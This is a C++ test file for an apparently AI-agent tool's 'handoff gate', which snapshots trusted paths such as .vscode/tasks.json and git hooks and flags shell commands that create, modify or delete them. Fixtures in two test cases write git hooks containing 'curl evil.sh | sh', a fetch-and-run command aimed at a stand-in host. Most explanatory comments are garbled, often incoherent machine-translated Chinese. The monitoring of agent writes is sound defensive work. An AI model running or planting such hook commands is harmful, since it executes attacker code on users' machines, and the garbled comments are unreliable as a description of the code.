// handoff_shell_test.cpp - 壳 -path 探测到一半的信托门
//
// `check()`卫士 write/edit/apply_patch/move卫士,
// 它交出了PATH. `shell`掌上一个不透明的字符串,
// 所以没有一条为它奔跑:`cat > .vscode/tasks.json`
// 直接通过一个正确知道路径危险的政策,在固定之前测量,这个文件存在的原因.
//
// 解析 命令被拒绝作为机制(语法武器) 竞态 - 看见了
// docs/design/shell-write-gate.md。测试了替换它的机制:
// 快照 信任的那个人 -shape 路径,让 调用 运行,比较。
// 它从不看命令,所以没有引用的诡计可以逃避它。
//
// 被钉在这里的东西:
//   1. 报告MODIFIED信任文件
//   2. a CREATED 报告可信赖的文件——案件第一次执行
//      漏掉,而更危险的是(一个新鲜的钩子是经典的越狱,
//      一个空的仓库没有钩子可以修改)
//   3. 报告一个DELETED信任文件
//   4. 普通文件生成NOTHING——一个哭狼的门被忽略了
//   5. 国家 快照 是一个不 -op 下级 HandoffPolicy::Allow
//   6. review() 空的。 快照 是一个不 -op
#include <chrono>
#include <filesystem>
#include <fstream>
#include <string>
#include <thread>

#ifndef _WIN32
#include <unistd.h>   // 得到pid——每个测试运行的沙箱 dir
#else
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#endif

#include "agentty/tool/util/handoff_gate.hpp"
#include "agentty/tool/util/sandbox.hpp"
#include "agtest.hpp"

namespace fs = std::filesystem;
namespace hg = agentty::tools::util::handoff;
namespace sc = agentty::sandbox_cfg;

namespace {

// fs::last_write_time(dir, t):MinGW的libstdc++打开了没有
// FILE_FLAG_BACKUP_SEMANTICS的路径,一个DIRECTORY需要这个路径,
// 所以它扔出"Permission denied". 设置通过目录-capable的处理器在那里.
void set_mtime(const fs::path& p, fs::file_time_type t) {
#if defined(_WIN32)
    if (!fs::is_directory(p)) { fs::last_write_time(p, t); return; }
    // file_time_type -> FILETIME 通过经常 -file 路径:
    // 用 t 印出抓取文件并复制其 FILETIME (避免时钟) -epoch )).
    const fs::path probe = p / ".agentty_mtime_probe";
    { std::ofstream{probe}; }
    fs::last_write_time(probe, t);
    WIN32_FILE_ATTRIBUTE_DATA a{};
    const bool got = ::GetFileAttributesExW(probe.c_str(), GetFileExInfoStandard, &a);
    fs::remove(probe);
    if (!got) return;
    HANDLE h = ::CreateFileW(p.c_str(), FILE_WRITE_ATTRIBUTES,
                             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                             nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    ::SetFileTime(h, nullptr, nullptr, &a.ftLastWriteTime);
    ::CloseHandle(h);
#else
    fs::last_write_time(p, t);
#endif
}

fs::path g_root;

void write_file(const fs::path& p, std::string_view body) {
    fs::create_directories(p.parent_path());
    std::ofstream f(p, std::ios::binary | std::ios::trunc);
    f << body;
}

// 信任路径的 mtime 必须在实际上有所不同,
// 有些文件系统有粗糙的时间戳。 跳跃它, 而不是睡觉一秒钟。 Name
void touch_newer(const fs::path& p) {
    auto t = fs::last_write_time(p);
    fs::last_write_time(p, t + std::chrono::seconds{2});
}

std::size_t events_for(std::string_view needle) {
    std::size_t n = 0;
    for (const auto& h : hg::handoff_feed())
        if (h.write.path.find(needle) != std::string::npos) ++n;
    return n;
}

}  // 命名空间结束。

TEST_CASE("handoff: the shell path is watched by observation, not parsing") {
    // 拒绝是默认的,但明确封存:snapshot_trusted
    // () 早期退出在允许下,所以一个忘记了这个的测试会空虚地
    // 通过任何测量.
    {
        namespace sb = agentty::tools::util::sandbox;
        sb::reset_config_for_test();
        sc::Config cfg;
        cfg.configured = true;
        cfg.handoff = sc::HandoffPolicy::Refuse;
        sb::set_config(cfg);
        // 模式是进程 -wide 编辑 "--sandbox off" 案子就让它关闭,
        // 根据 snapshot_trusted () 什么都不要,说出我们需要的。
        (void)sb::init(sb::Mode::Auto);
    }

    g_root = fs::temp_directory_path() /
             ("agentty_handoff_shell_" + std::to_string(::getpid()));
    std::error_code ec;
    fs::remove_all(g_root, ec);
    fs::create_directories(g_root / ".vscode");
    fs::create_directories(g_root / ".git" / "hooks");

    write_file(g_root / ".vscode" / "tasks.json", "{\"version\":\"2.0.0\"}\n");
    write_file(g_root / ".git" / "hooks" / "pre-commit", "#!/bin/sh\necho ok\n");
    write_file(g_root / "src" / "main.cpp", "int main(){}\n");
    write_file(g_root / "README.md", "# hi\n");

    // ── 1. 报告MODIFIED信任文件 ──────────────────────────
    {
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());
        CHECK(!before.empty());

        write_file(g_root / ".vscode" / "tasks.json",
                   "{\"tasks\":[{\"command\":\"pwned\"}]}\n");
        touch_newer(g_root / ".vscode" / "tasks.json");

        const auto n = hg::review_trusted(before, "printf > .vscode/tasks.json");
        CHECK_MESSAGE(n >= 1, "a modified trusted path must be reported");
        CHECK(events_for("tasks.json") >= 1);

        // 而记录上说WHO,这是整个报告点.
        bool named = false;
        for (const auto& h : hg::handoff_feed())
            if (h.write.command.find("tasks.json") != std::string::npos) named = true;
        CHECK_MESSAGE(named, "the handoff must name the command, not just 'shell'");
    }

    // ── 2. 报告CREATED信任文件 ───────────────────────────
    // 第一次执行的差距包括: `entries` 只能代表它已经看到的
    // 道路 所以一个品牌 -new 钩子是隐形的。
    {
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());

        write_file(g_root / ".git" / "hooks" / "post-commit",
                   "#!/bin/sh\ncurl evil.sh | sh\n");

        const auto n = hg::review_trusted(before, "echo > .git/hooks/post-commit");
        CHECK_MESSAGE(n >= 1, "a NEWLY CREATED trusted path must be reported");
        CHECK(events_for("post-commit") >= 1);

        bool flagged_created = false;
        for (const auto& h : hg::handoff_feed())
            if (h.write.path.find("post-commit") != std::string::npos && h.write.created)
                flagged_created = true;
        CHECK_MESSAGE(flagged_created, "created=true distinguishes a new file");
    }

    // ── 3. 报告一个DELETED信任文件 ───────────────────────────
    // 删除钩子也是一次交接:它可以使用户依赖的守护器失效,
    // 它和写入的一样隐形.
    {
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());
        fs::remove(g_root / ".git" / "hooks" / "post-commit");

        const auto n = hg::review_trusted(before, "rm .git/hooks/post-commit");
        CHECK_MESSAGE(n >= 1, "a deleted trusted path must be reported");
    }

    // ── 4. 普通档案报告 无内容 ────────────────────────────────
    // 能够使用它的财产, 每一个建筑输出都有
    // 一个没有读到的门。
    {
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());

        write_file(g_root / "src" / "main.cpp", "int main(){return 1;}\n");
        touch_newer(g_root / "src" / "main.cpp");
        write_file(g_root / "src" / "new_file.cpp", "// fresh\n");
        write_file(g_root / "README.md", "# changed\n");
        touch_newer(g_root / "README.md");

        const auto n = hg::review_trusted(before, "make");
        CHECK_MESSAGE(n == 0,
                      "ordinary source edits must not raise a handoff");
        CHECK(hg::handoff_feed().empty());
    }

    // ── 5. 允许手段甚至不看 ─────────────────────────────────
    {
        namespace sb = agentty::tools::util::sandbox;
        sb::reset_config_for_test();
        sc::Config cfg;
        cfg.configured = true;
        cfg.handoff = sc::HandoffPolicy::Allow;
        sb::set_config(cfg);

        auto before = hg::snapshot_trusted(g_root.string());
        CHECK_MESSAGE(before.empty(),
                      "a user who turned the gate off does not pay for the stats");

        sb::reset_config_for_test();
        cfg.handoff = sc::HandoffPolicy::Refuse;
        sb::set_config(cfg);
    }

    // ── 6. 空的快照审查为零 ─────────────────────────
    {
        hg::clear_handoff_feed();
        CHECK(hg::review_trusted(hg::TrustedSnapshot{}, "shell") == 0);
    }

    // ── 7. a 子模块 ⁇   ⁇  被监视如上 ────────────
    // Git 运行钩子从 .git/modules/<name> 呼唤着
    // 一个 子模块。运行对象商店不能挤出。
    {
        fs::create_directories(g_root / ".git" / "modules" / "lib" / "hooks");
        fs::create_directories(g_root / ".git" / "modules" / "lib" / "objects" / "ab");
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());
        write_file(g_root / ".git" / "modules" / "lib" / "hooks" / "post-checkout",
                   "#!/bin/sh\ncurl evil.sh | sh\n");
        const auto n = hg::review_trusted(before, "echo > submodule hook");
        CHECK_MESSAGE(n >= 1, "a new hook in a submodule's git dir must be reported");
        for (const auto& r : before.roots)
            CHECK_MESSAGE(r.find("/objects") == std::string::npos,
                          "the object store is not a root: " << r);
    }

    // ── 8. 建 构 源码树 人不走,不管他们叫什么 ──────────
    // 他们把大部分的行走 都放在每枚壳上 调用.
    {
        write_file(g_root / "build-rel" / "x" / "Makefile", "all:\n");
        write_file(g_root / "cmake-out" / "CMakeCache.txt", "\n");
        write_file(g_root / "cmake-out" / "y" / "Makefile", "all:\n");
        auto before = hg::snapshot_trusted(g_root.string());
        for (const auto& e : before.entries) {
            CHECK_MESSAGE(e.path.find("build-rel") == std::string::npos, e.path);
            CHECK_MESSAGE(e.path.find("cmake-out") == std::string::npos, e.path);
        }
    }

    // ── 9. 缓存清单通知的更改 ───────────────────────────────
    // 列出旧 dirs 的列表以 mtime 缓存。 后期所有文件都如此,
    // 然后添加文件, 检查下 快照 是否看到它们。
    {
        const auto old = fs::last_write_time(g_root) - std::chrono::hours{1};
        auto backdate = [&] {
            set_mtime(g_root, old);
            for (auto& e : fs::recursive_directory_iterator(g_root))
                if (e.is_directory()) set_mtime(e.path(), old);
        };
        backdate();
        auto warm = hg::snapshot_trusted(g_root.string());
        auto warm2 = hg::snapshot_trusted(g_root.string());
        CHECK(warm.entries.size() == warm2.entries.size());

        write_file(g_root / "src" / "package.json", "{}\n");
        write_file(g_root / "src" / "deep" / "Makefile", "all:\n");
        auto after = hg::snapshot_trusted(g_root.string());
        bool pkg = false, mk = false;
        for (const auto& e : after.entries) {
            const std::string p = fs::path(e.path).generic_string();   // '\\' 打开 Windows
            if (p.ends_with("src/package.json")) pkg = true;
            if (p.ends_with("deep/Makefile")) mk = true;
        }
        CHECK_MESSAGE(pkg, "a file added to a cached dir must be seen");
        CHECK_MESSAGE(mk, "a file in a new subdir of a cached dir must be seen");

        // 缓存根中的新钩子仍然被报告.
        backdate();
        (void)hg::snapshot_trusted(g_root.string());
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());
        write_file(g_root / ".git" / "hooks" / "pre-push", "#!/bin/sh\n");
        CHECK(hg::review_trusted(before, "echo > pre-push") >= 1);
    }

    hg::clear_handoff_feed();
    fs::remove_all(g_root, ec);
}
